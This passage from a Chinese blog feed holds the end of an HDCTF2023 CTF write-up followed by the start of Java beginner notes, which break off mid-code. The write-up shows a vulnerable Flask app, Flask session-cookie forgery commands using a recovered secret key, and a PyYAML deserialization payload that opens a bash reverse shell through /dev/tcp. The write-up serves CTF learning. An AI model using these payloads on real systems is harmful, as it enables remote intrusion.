&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pwd&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwd</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(pwdpath)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;app.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        <span class="keyword">if</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        res = urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">   <span class="keyword">for</span> blackstr <span class="keyword">in</span> BLACK_LIST:</span><br><span class="line">       <span class="keyword">if</span> blackstr <span class="keyword">in</span> filename:</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            flash(<span class="string">&#x27;No file part&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Empty file&quot;</span></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./uploads/&#x27;</span>):</span><br><span class="line">                os.makedirs(<span class="string">&#x27;./uploads/&#x27;</span>)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;upload successfully!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/boogipop&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>)==<span class="string">&quot;Welcome To HDCTF2023&quot;</span>:</span><br><span class="line">        LoadedFile=request.args.get(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(LoadedFile):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(LoadedFile) <span class="keyword">as</span> f:</span><br><span class="line">            yaml.full_load(f)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwdpath = os.popen(<span class="string">&quot;pwd&quot;</span>).read()</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在&#x2F;boogipop路由发现yaml.full_load(f)可知这里可以pyyaml反序列化,还需要修改<code>session[passport]=Welcome To HDCTF2023</code>.然后传参file&#x3D;你上传的文件就能反序列化其中的内容</p><blockquote><p>前提知识：<br>在 python 中使用 uuid 模块生成 UUID（通用唯一识别码）。可以使用 uuid.getnode()<br>方法来获取计算机的硬件地址，这个地址将作为 UUID 的一部分。<br>那么&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address，这个就是网卡的位置，读取他进行伪造即可。</p></blockquote><p>利用为协议读取到网卡地址，在利用脚本内进行解密，修改上班</p><p><img src="http://raw.githubusercontent.com/qingchuana/img/main/img/image-20230923160402382.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line">random.seed(0x0242ac02e293)</span><br><span class="line">print(str(random.random()*233))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到secret_key是141.04900203197468</p><p>之后session伪造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c &quot;eyJwYXNzcG9ydCI6IllhbWlZYW1pIn0.ZQ6iLA.1bAPKmKsaDM4mePRtx9J7xw5EUk&quot; -s &quot;141.04900203197468&quot;</span><br><span class="line">&#123;&#x27;passport&#x27;: &#x27;YamiYami&#x27;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;python3 flask_session_cookie_manager3.py  encode -s &quot;141.04900203197468&quot; -t &quot;&#123;&#x27;passport&#x27;: &#x27;Welcome To HDCTF2023&#x27;&#125;&quot;</span><br><span class="line">eyJwYXNzcG9ydCI6IldlbGNvbWUgVG8gSERDVEYyMDIzIn0.ZQ6iZQ.YCpaoTH0-UzTB1p3Y82XrgKp2oU</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">!!python/object/new:str</span><br><span class="line">    args: []</span><br><span class="line">    state: !!python/tuple</span><br><span class="line">      - &quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port &lt;&amp;1\&quot;&#x27;)&quot;</span><br><span class="line">      - !!python/object/new:staticmethod</span><br><span class="line">        args: []</span><br><span class="line">        state:</span><br><span class="line">          update: !!python/name:eval</span><br><span class="line">          items: !!python/name:list</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>命名1.txt在upload页面上交躲避黑名单<br> 然后在&#x2F;boogipop路由下改变session,file&#x3D;uploads&#x2F;1.txt</p><p>最终试了半天过不了，真是奇了怪了，好像环境有点问题</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java学习笔记</title>
      <link href="/2023/08/24/java%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/08/24/java%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="java学习"><a href="#java学习" class="headerlink" title="java学习"></a>java学习</h1><h2 id="一-、基础语法"><a href="#一-、基础语法" class="headerlink" title="一 、基础语法"></a>一 、基础语法</h2><p>创建文件 <strong>HelloWorld.java(文件名需与类名一致)</strong></p><p>输入pvsm回车自动创建主函数，sout输出打印</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pvsm-》public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sout-&gt;System.out.println();</span><br></pre></td></tr></table></figure><p>编写 Java 程序时，应注意以下几点：</p><ul><li>​<strong>大小写敏感</strong>：Java 是大小写敏感的，这就意味着标识符 Hello 与 hello 是不同的。</li><li>​<strong>类名</strong>：对于所有的类来说，类名的首字母应该大写。如果类名由若干单词组成，那么每个单词的首字母应该大写，例如 <strong>MyFirstJavaClass</strong> 。</li><li>​<strong>方法名</strong>：所有的方法名都应该以小写字母开头。如果方法名含有若干单词，则后面的每个单词首字母大写。</li><li>​<strong>源文件名</strong>：源文件名必须和类名相同。当保存文件的时候，你应该使用类名作为文件名保存（切记 Java 是大小写敏感的），文件名的后缀为 <strong>.java</strong>。（如果文件名和类名不相同则会导致编译错误）。</li><li>​<strong>主方法入口</strong>：所有的 Java 程序由 <strong>public static void main(String[] args)</strong> 方法开始执行。</li></ul><p>###注释类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">单行注释//</span><br><span class="line"></span><br><span class="line">多行注释/**/</span><br><span class="line"></span><br><span class="line">文档注释/**</span><br><span class="line">*1</span><br><span class="line">*1</span><br><span class="line">*1</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="标识符和关键字"><a href="#标识符和关键字" class="headerlink" title="标识符和关键字"></a>标识符和关键字</h3><p>Java 所有的组成部分都需要名字。类名、变量名以及方法名都被称为标识符。</p><p>关于 Java 标识符，有以下几点需要注意：</p><ul><li>​所有的标识符都应该以字母（A-Z 或者 a-z）,美元符（$）、或者下划线（_）开始</li><li>​首字符之后可以是字母（A-Z 或者 a-z）,美元符（$）、下划线（_）或数字的任何字符组合</li><li>​关键字不能用作标识符</li><li>​标识符是大小写敏感的</li><li>​合法标识符举例：age、$salary、_value、__1_value</li><li>​非法标识符举例：123abc、-salary</li></ul><p>可以使用中文，但不建议使用，拼音也少用，显得不咋好</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/image/image-20230821132029953-1698627034978-1-1700990364418-195-1700994560237-169.png"></p><p>面列出了 Java 关键字。这些保留字不能用于常量、变量、和任何标识符的名称。</p><table><thead><tr><th>类别</th><th>关键字</th><th>说明</th></tr></thead><tbody><tr><td>访问控制</td><td>private</td><td>私有的</td></tr><tr><td>protected</td><td>受保护的</td><td></td></tr><tr><td>public</td><td>公共的</td><td></td></tr><tr><td>default</td><td>默认</td><td></td></tr><tr><td>类、方法和变量修饰符</td><td>abstract</td><td>声明抽象</td></tr><tr><td>class</td><td>类</td><td></td></tr><tr><td>extends</td><td>扩充、继承</td><td></td></tr><tr><td>final</td><td>最终值、不可改变的</td><td></td></tr><tr><td>implements</td><td>实现（接口）</td><td></td></tr><tr><td>interface</td><td>接口</td><td></td></tr><tr><td>native</td><td>本地、原生方法（非 Java 实现）</td><td></td></tr><tr><td>new</td><td>创建</td><td></td></tr><tr><td>static</td><td>静态</td><td></td></tr><tr><td>strictfp</td><td>严格浮点、精准浮点</td><td></td></tr><tr><td>synchronized</td><td>线程、同步</td><td></td></tr><tr><td>transient</td><td>短暂</td><td></td></tr><tr><td>volatile</td><td>易失</td><td></td></tr><tr><td>程序控制语句</td><td>break</td><td>跳出循环</td></tr><tr><td>case</td><td>定义一个值以供 switch 选择</td><td></td></tr><tr><td>continue</td><td>继续</td><td></td></tr><tr><td>do</td><td>运行</td><td></td></tr><tr><td>else</td><td>否则</td><td></td></tr><tr><td>for</td><td>循环</td><td></td></tr><tr><td>if</td><td>如果</td><td></td></tr><tr><td>instanceof</td><td>实例</td><td></td></tr><tr><td>return</td><td>返回</td><td></td></tr><tr><td>switch</td><td>根据值选择执行</td><td></td></tr><tr><td>while</td><td>循环</td><td></td></tr><tr><td>错误处理</td><td>assert</td><td>断言表达式是否为真</td></tr><tr><td>catch</td><td>捕捉异常</td><td></td></tr><tr><td>finally</td><td>有没有异常都执行</td><td></td></tr><tr><td>throw</td><td>抛出一个异常对象</td><td></td></tr><tr><td>throws</td><td>声明一个异常可能被抛出</td><td></td></tr><tr><td>try</td><td>捕获异常</td><td></td></tr><tr><td>包相关</td><td>import</td><td>引入</td></tr><tr><td>package</td><td>包</td><td></td></tr><tr><td>基本类型</td><td>boolean</td><td>布尔型</td></tr><tr><td>byte</td><td>字节型</td><td></td></tr><tr><td>char</td><td>字符型</td><td></td></tr><tr><td>double</td><td>双精度浮点</td><td></td></tr><tr><td>float</td><td>单精度浮点</td><td></td></tr><tr><td>int</td><td>整型</td><td></td></tr><tr><td>long</td><td>长整型</td><td></td></tr><tr><td>short</td><td>短整型</td><td></td></tr><tr><td>变量引用</td><td>super</td><td>父类、超类</td></tr><tr><td>this</td><td>本类</td><td></td></tr><tr><td>void</td><td>无返回值</td><td></td></tr><tr><td>保留关键字</td><td>goto</td><td>是关键字，但不能使用</td></tr><tr><td>const</td><td>是关键字，但不能使用</td><td></td></tr></tbody></table><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>java是一种强类型语言，所有变量必须定以后才能使用，更安全</p><p>java数据类型可以分为两大类:</p><p>基本类型</p><p>引用类型</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/image/image-20230821133215837-1692596095569-1-1693831300400-56-1698627034979-3-1700990364418-197-1700994560237-172.png"></p><p>每个变量都有类型，必须对应</p><table><thead><tr><th>基本类型</th><th>boolean</th><th>布尔型</th></tr></thead><tbody><tr><td>byte</td><td>字节型</td><td></td></tr><tr><td>char</td><td>字符型</td><td></td></tr><tr><td>double</td><td>双精度浮点</td><td></td></tr><tr><td>float</td><td>单精度浮点</td><td></td></tr><tr><td>int</td><td>整型</td><td></td></tr><tr><td>long</td><td>长整型</td><td></td></tr><tr><td>short</td><td>短整型</td><td></td></tr></tbody></table><p>区别去long，数字后面一般加一个L</p><p>float数字后加F</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230821134831928.png" alt="image-20230821134831928"></p><h5 id="什么是字节"><a href="#什么是字节" class="headerlink" title="什么是字节"></a>什么是字节</h5><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/image/image-20230821135115539-1698627034979-5-1700990364418-198-1700994560237-170.png"></p><p>###数据类型拓展</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        String a=10;</span></span><br><span class="line"><span class="comment">//        String b=&quot;10&quot;;</span></span><br><span class="line">        <span class="comment">//整数拓展  进制  二进制0b</span></span><br><span class="line">        <span class="type">int</span> i=<span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> i1=<span class="number">010</span>;<span class="comment">//8进制</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span><span class="number">0x10</span>;<span class="comment">//16进制</span></span><br><span class="line">        System.out.println(i);</span><br><span class="line">        System.out.println(i1);</span><br><span class="line">        System.out.println(i2);</span><br><span class="line">        <span class="comment">//浮点数扩展</span></span><br><span class="line">        <span class="comment">//float   有限  离散  舍入误差  大约</span></span><br><span class="line">        <span class="comment">//double</span></span><br><span class="line">        <span class="comment">//最好完全使用浮点数进行比较</span></span><br><span class="line">        <span class="comment">//big。。。。</span></span><br><span class="line">        <span class="type">float</span> f=<span class="number">0.1f</span>;</span><br><span class="line">        <span class="type">double</span> d=<span class="number">1.0</span>/<span class="number">10</span>;</span><br><span class="line">        System.out.println(f==d);</span><br><span class="line">        <span class="type">float</span> d1=<span class="number">123123123123f</span>;</span><br><span class="line">        <span class="type">float</span> d2=d1+<span class="number">1</span>;</span><br><span class="line">        System.out.println(d1=d2);</span><br><span class="line">        <span class="comment">//字符拓展</span></span><br><span class="line">        <span class="type">char</span> c1=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="type">char</span> <span class="variable">c2</span> <span class="operator">=</span><span class="string">&#x27;中&#x27;</span>;</span><br><span class="line">        System.out.println(c1);</span><br><span class="line">        System.out.println((<span class="type">int</span>)c1);<span class="comment">//强制转换</span></span><br><span class="line">        System.out.println(c2);</span><br><span class="line">        System.out.println((<span class="type">int</span>)c2);<span class="comment">//强制转换</span></span><br><span class="line">        <span class="comment">//所以字符本质还是数字</span></span><br><span class="line">        <span class="comment">//编码 unicode 2字节  65536 excel  2 16=65536</span></span><br><span class="line">        <span class="type">char</span> c3=<span class="string">&#x27;\u0061&#x27;</span>;</span><br><span class="line">        System.out.println(c3);</span><br><span class="line">        <span class="comment">//转义字符</span></span><br><span class="line">        <span class="comment">// \t</span></span><br><span class="line">        System.out.println(<span class="string">&quot;hello\tworld！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h5><table><thead><tr><th>n</th><th>换行 (0x0a)</th></tr></thead><tbody><tr><td>\r</td><td>回车 (0x0d)</td></tr><tr><td>\f</td><td>换页符(0x0c)</td></tr><tr><td>\b</td><td>退格 (0x08)</td></tr><tr><td>\0</td><td>空字符 (0x0)</td></tr><tr><td>\s</td><td>空格 (0x20)</td></tr><tr><td>\t</td><td>制表符</td></tr><tr><td>&quot;</td><td>双引号</td></tr><tr><td>&#39;</td><td>单引号</td></tr><tr><td>\</td><td>反斜杠</td></tr><tr><td>\ddd</td><td>八进制字符 (ddd)</td></tr><tr><td>\uxxxx</td><td>16进制Unicode字符 (xxxx)</td></tr></tbody></table><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>由于java是强类型语言，所以要进行有些运算的时候，需要用到类转换</p><p>低——————&gt;高</p><p>byte,short,char-&gt;iny-&gt;long-&gt;float-&gt;double（小数优先级比较高）</p><p>运算中，不同类型的数据会先转化为同一类型，然后进行运算</p><p>强制类型转换  （类型）变量名  高–》低</p><p>自动类型转换  低–》高</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">128</span>;</span><br><span class="line">       <span class="type">byte</span> b=(<span class="type">byte</span>)i;<span class="comment">//内存溢出</span></span><br><span class="line">       <span class="comment">//强制转换   （类型）变量名  高--》低</span></span><br><span class="line">       <span class="comment">//自动类型转换   低--》高</span></span><br><span class="line">       System.out.println(i);</span><br><span class="line">       System.out.println(b);</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">       * 注意点：</span></span><br><span class="line"><span class="comment">       * 1.不能对布尔型进行转换</span></span><br><span class="line"><span class="comment">       * 2.不能把对象类型转换为不相干的类型</span></span><br><span class="line"><span class="comment">       * 3.在把高容量转换到低容量的时候，强制转换</span></span><br><span class="line"><span class="comment">       * 4.转换的时候可能存在内存溢出，或者精度问题！*/</span></span><br><span class="line">       System.out.println((<span class="type">int</span>)<span class="number">23.7</span>);<span class="comment">//23</span></span><br><span class="line">       System.out.println((<span class="type">int</span>)-<span class="number">45.89f</span>);<span class="comment">//45</span></span><br><span class="line"></span><br><span class="line">       <span class="type">char</span> c=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">       <span class="type">int</span> d=c+<span class="number">1</span>;</span><br><span class="line">       System.out.println(d);</span><br><span class="line">       System.out.println((<span class="type">char</span>)d);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>java是一种强类型语言，每个变量必须声明其类型</p><p>java变量是程序中最基本的存储单元，其要是包括变量名，变量类型和作用域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type varName [=value][&#123;,varName[=value]&#125;]</span><br><span class="line">//数据类型  变量名=值；可以用逗号隔开来声明多个同类型变量。</span><br></pre></td></tr></table></figure><p>####注意事项：</p><ul><li><p>每个变量都有类型，类型可以使基本型也可以是引用类型。</p></li><li><p>每个变量名必须是合法标识符</p></li><li><p>变量声明是一条完整的语句，因此没有一个声明都必须以分号结束</p><p>变量作用域：</p><p>类变量</p><p>实例变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo06</span> &#123;</span><br><span class="line">    <span class="comment">//属性：变量</span></span><br><span class="line">    <span class="comment">//类变量 static</span></span><br><span class="line">    <span class="keyword">static</span> <span class="type">double</span> <span class="variable">salary</span> <span class="operator">=</span><span class="number">2500</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//实例变量：从属于对象；如果不自行初始化，这个类型默认值 0   0.0</span></span><br><span class="line">    <span class="comment">//布尔值默认为false</span></span><br><span class="line">    <span class="comment">//除了基本类型，其余默认值都是null</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="comment">//main方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//局部变量：必须声明和初始化值</span></span><br><span class="line">        <span class="type">int</span> i=<span class="number">10</span>;</span><br><span class="line">        System.out.println(i);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//变量类型 变量名字=new demo06</span></span><br><span class="line">        demo06 demo06=<span class="keyword">new</span> <span class="title class_">demo06</span>();</span><br><span class="line">        System.out.println(demo06.age);</span><br><span class="line">        System.out.println(demo06.name);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//类变量  static</span></span><br><span class="line">        System.out.println(salary);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//其他方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><p>常量（Constant）：初始化（initialize）后不能再改变值！，不会变动的值</p><p>所谓常量可以理解为一种特殊的变量，他的值被设定以后，在程序运行过程中不允许改变</p><p>final 常量名&#x3D;值；</p><p>final double PI&#x3D;3.14;</p><p>常量名一般使用大写名字符。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo07</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">double</span> PI=<span class="number">3.14</span>;</span><br><span class="line">    <span class="comment">//static final修饰符，不分前后顺序</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(PI);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="变量命名规范"><a href="#变量命名规范" class="headerlink" title="变量命名规范"></a>变量命名规范</h3><p>所有变量，方法，雷名：见名知意</p><p>类成员变量：首字母小写和驼峰原则：monthSalary 出了第一个字母以外后面每隔字符首字母大写</p><p>局部变量：首字母小写和驼峰原则</p><p>常量：大写字母和下划线MAX_VALUE</p><p>类名：首字母大写和驼峰原则</p><p>方法名：首字母小写he驼峰原则</p><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><p>算术运算符:+， -，*，l，%，++， –</p><p>赋值运算符&#x3D;<br>关系运算符:&gt;，&lt;，&gt;&#x3D;，&#x3D;，&#x3D;&#x3D;，!&#x3D; instanceof</p><p>逻辑运算符: &amp;&amp;，||，!<br>位运算符:&amp;，|，^，~，&gt;&gt;，&lt;&lt;，&gt;&gt;&gt;(了解! ! ! )条件运算符?︰<br>扩展赋值运算符:+&#x3D;，-&#x3D;，*&#x3D;，&#x2F;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">package operator;</span><br><span class="line"></span><br><span class="line">public class Demo01 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        int a=10;</span><br><span class="line">        int b=20;</span><br><span class="line">        int 